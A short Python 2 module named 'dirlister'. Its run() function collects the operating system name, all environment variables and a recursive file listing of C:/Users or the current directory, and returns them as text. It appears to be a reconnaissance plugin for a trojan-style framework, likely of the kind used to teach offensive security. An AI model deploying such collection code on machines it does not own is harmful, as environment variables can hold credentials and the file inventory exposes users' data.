import os


def listdir(tmp_path):
    info=""
    for dirpath,dirname,files in os.walk(tmp_path):
        for filename in files:
            info += "%s/%s"%(dirpath,filename)+"\n"

    return info


def run():
    print "[*] In dirlister module."
    content=os.name+"\r\n"
    for key in os.environ:
        content += "%s:%s"%(key,os.environ[key])+"\n"

    if os.name == "nt":
        content += listdir("C:/Users")
    else:
        content += listdir(".")

    return content

